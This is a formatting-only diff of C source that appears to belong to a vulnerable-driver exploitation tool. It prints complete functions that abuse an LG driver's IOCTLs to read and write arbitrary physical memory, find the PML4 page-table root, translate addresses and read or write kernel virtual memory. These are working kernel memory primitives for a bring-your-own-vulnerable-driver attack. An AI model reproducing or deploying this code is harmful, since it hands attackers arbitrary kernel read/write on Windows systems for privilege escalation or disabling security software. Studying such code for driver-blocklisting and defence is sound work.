@@ -5,52 +5,44 @@
 
 //
 // WARNING, (BUG)FEATURE ALERT
-// 
+//
 // LG crapware does not check API call results.
 // This will eventually lead to BSOD in case of mapping failure.
 //
 
 /*
-* LHAReadPhysicalMemory
-*
-* Purpose:
-*
-* Read physical memory through MmMapIoSpace.
-*
-*/
-BOOL WINAPI LHAReadPhysicalMemory(
-    _In_ HANDLE DeviceHandle,
-    _In_ ULONG_PTR PhysicalAddress,
-    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
-    _In_ ULONG NumberOfBytes)
-{
+ * LHAReadPhysicalMemory
+ *
+ * Purpose:
+ *
+ * Read physical memory through MmMapIoSpace.
+ *
+ */
+BOOL WINAPI LHAReadPhysicalMemory(_In_ HANDLE DeviceHandle,
+                                  _In_ ULONG_PTR PhysicalAddress,
+                                  _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
+                                  _In_ ULONG NumberOfBytes) {
     LHA_READ_PHYSICAL_MEMORY request;
 
     request.Address = PhysicalAddress;
     request.Size = NumberOfBytes;
 
-    return supCallDriver(DeviceHandle,
-        IOCTL_LHA_READ_PHYSICAL_MEMORY,
-        &request,
-        sizeof(request),
-        Buffer,
-        NumberOfBytes);
+    return supCallDriver(DeviceHandle, IOCTL_LHA_READ_PHYSICAL_MEMORY, &request,
+                         sizeof(request), Buffer, NumberOfBytes);
 }
 
 /*
-* LHAWritePhysicalMemory
-*
-* Purpose:
-*
-* Write to physical memory.
-*
-*/
-BOOL WINAPI LHAWritePhysicalMemory(
-    _In_ HANDLE DeviceHandle,
-    _In_ ULONG_PTR PhysicalAddress,
-    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
-    _In_ ULONG NumberOfBytes)
-{
+ * LHAWritePhysicalMemory
+ *
+ * Purpose:
+ *
+ * Write to physical memory.
+ *
+ */
+BOOL WINAPI LHAWritePhysicalMemory(_In_ HANDLE DeviceHandle,
+                                   _In_ ULONG_PTR PhysicalAddress,
+                                   _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
+                                   _In_ ULONG NumberOfBytes) {
     BOOL bResult = FALSE;
     SIZE_T size;
     ULONG value;
@@ -60,22 +52,16 @@ BOOL WINAPI LHAWritePhysicalMemory(
     value = FIELD_OFFSET(LHA_WRITE_PHYSICAL_MEMORY, Data) + NumberOfBytes;
     size = ALIGN_UP_BY(value, PAGE_SIZE);
 
-    pRequest = (LHA_WRITE_PHYSICAL_MEMORY*)supAllocateLockedMemory(size,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_READWRITE);
+    pRequest = (LHA_WRITE_PHYSICAL_MEMORY*)supAllocateLockedMemory(
+        size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     if (pRequest) {
-
         pRequest->Address = PhysicalAddress;
         pRequest->Size = NumberOfBytes;
         RtlCopyMemory(&pRequest->Data, Buffer, NumberOfBytes);
 
-        bResult = supCallDriver(DeviceHandle,
-            IOCTL_LHA_WRITE_PHYSICAL_MEMORY,
-            pRequest,
-            (ULONG)size,
-            NULL,
-            0);
+        bResult = supCallDriver(DeviceHandle, IOCTL_LHA_WRITE_PHYSICAL_MEMORY,
+                                pRequest, (ULONG)size, NULL, 0);
 
         if (!bResult)
             dwError = GetLastError();
@@ -88,17 +74,15 @@ BOOL WINAPI LHAWritePhysicalMemory(
 }
 
 /*
-* LHAQueryPML4Value
-*
-* Purpose:
-*
-* Locate PML4.
-*
-*/
-BOOL WINAPI LHAQueryPML4Value(
-    _In_ HANDLE DeviceHandle,
-    _Out_ ULONG_PTR* Value)
-{
+ * LHAQueryPML4Value
+ *
+ * Purpose:
+ *
+ * Locate PML4.
+ *
+ */
+BOOL WINAPI LHAQueryPML4Value(_In_ HANDLE DeviceHandle,
+                              _Out_ ULONG_PTR* Value) {
     DWORD dwError = ERROR_SUCCESS;
     ULONG_PTR PML4 = 0;
     UCHAR* pbLowStub1M;
@@ -109,7 +93,6 @@ BOOL WINAPI LHAQueryPML4Value(
     SetLastError(ERROR_SUCCESS);
 
     do {
-
         pbLowStub1M = (UCHAR*)supHeapAlloc(cbRead);
         if (pbLowStub1M == NULL) {
             dwError = GetLastError();
@@ -117,24 +100,18 @@ BOOL WINAPI LHAQueryPML4Value(
         }
 
         for (ULONG_PTR i = 0; i < cbRead; i += PAGE_SIZE) {
-
-            if (!LHAReadPhysicalMemory(DeviceHandle,
-                i,
-                RtlOffsetToPointer(pbLowStub1M, i),
-                PAGE_SIZE))
-            {
+            if (!LHAReadPhysicalMemory(DeviceHandle, i,
+                                       RtlOffsetToPointer(pbLowStub1M, i),
+                                       PAGE_SIZE)) {
                 dwError = GetLastError();
                 break;
             }
-
         }
 
         if (dwError == ERROR_SUCCESS) {
-
             PML4 = supGetPML4FromLowStub1M((ULONG_PTR)pbLowStub1M);
             if (PML4)
                 *Value = PML4;
-
         }
 
     } while (FALSE);
@@ -147,90 +124,72 @@ BOOL WINAPI LHAQueryPML4Value(
 }
 
 /*
-* LHAVirtualToPhysical
-*
-* Purpose:
-*
-* Translate virtual address to the physical.
-*
-*/
-BOOL WINAPI LHAVirtualToPhysical(
-    _In_ HANDLE DeviceHandle,
-    _In_ ULONG_PTR VirtualAddress,
-    _Out_ ULONG_PTR* PhysicalAddress)
-{
-    return PwVirtualToPhysical(DeviceHandle,
-        LHAQueryPML4Value,
-        LHAReadPhysicalMemory,
-        VirtualAddress,
-        PhysicalAddress);
+ * LHAVirtualToPhysical
+ *
+ * Purpose:
+ *
+ * Translate virtual address to the physical.
+ *
+ */
+BOOL WINAPI LHAVirtualToPhysical(_In_ HANDLE DeviceHandle,
+                                 _In_ ULONG_PTR VirtualAddress,
+                                 _Out_ ULONG_PTR* PhysicalAddress) {
+    return PwVirtualToPhysical(DeviceHandle, LHAQueryPML4Value,
+                               LHAReadPhysicalMemory, VirtualAddress,
+                               PhysicalAddress);
 }
 
 /*
-* LHAReadKernelVirtualMemory
-*
-* Purpose:
-*
-* Read virtual memory.
-*
-*/
-BOOL WINAPI LHAReadKernelVirtualMemory(
-    _In_ HANDLE DeviceHandle,
-    _In_ ULONG_PTR Address,
-    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
-    _In_ ULONG NumberOfBytes)
-{
+ * LHAReadKernelVirtualMemory
+ *
+ * Purpose:
+ *
+ * Read virtual memory.
+ *
+ */
+BOOL WINAPI LHAReadKernelVirtualMemory(_In_ HANDLE DeviceHandle,
+                                       _In_ ULONG_PTR Address,
+                                       _Out_writes_bytes_(NumberOfBytes)
+                                           PVOID Buffer,
+                                       _In_ ULONG NumberOfBytes) {
     BOOL bResult;
     ULONG_PTR physicalAddress = 0;
 
     SetLastError(ERROR_SUCCESS);
 
-    bResult = LHAVirtualToPhysical(DeviceHandle,
-        Address,
-        &physicalAddress);
+    bResult = LHAVirtualToPhysical(DeviceHandle, Address, &physicalAddress);
 
     if (bResult) {
-
-        bResult = LHAReadPhysicalMemory(DeviceHandle,
-            physicalAddress,
-            Buffer,
-            NumberOfBytes);
-
+        bResult = LHAReadPhysicalMemory(DeviceHandle, physicalAddress, Buffer,
+                                        NumberOfBytes);
     }
 
     return bResult;
 }
 
 /*
-* LHAWriteKernelVirtualMemory
-*
-* Purpose:
-*
-* Write virtual memory.
-*
-*/
-BOOL WINAPI LHAWriteKernelVirtualMemory(
-    _In_ HANDLE DeviceHandle,
-    _In_ ULONG_PTR Address,
-    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
-    _In_ ULONG NumberOfBytes)
-{
+ * LHAWriteKernelVirtualMemory
+ *
+ * Purpose:
+ *
+ * Write virtual memory.
+ *
+ */
+BOOL WINAPI LHAWriteKernelVirtualMemory(_In_ HANDLE DeviceHandle,
+                                        _In_ ULONG_PTR Address,
+                                        _Out_writes_bytes_(NumberOfBytes)
+                                            PVOID Buffer,
+                                        _In_ ULONG NumberOfBytes) {
     BOOL bResult;
     ULONG_PTR physicalAddress = 0;
 
     SetLastError(ERROR_SUCCESS);
 
-    bResult = LHAVirtualToPhysical(DeviceHandle,
-        Address,
-        &physicalAddress);
+    bResult = LHAVirtualToPhysical(DeviceHandle, Address, &physicalAddress);
 
     if (bResult) {
-
-        bResult = LHAWritePhysicalMemory(DeviceHandle,
-            physicalAddress,
-            Buffer,
-            NumberOfBytes);
-
+        bResult = LHAWritePhysicalMemory(DeviceHandle, physicalAddress, Buffer,
+                                         NumberOfBytes);
     }
 
     return bResult;
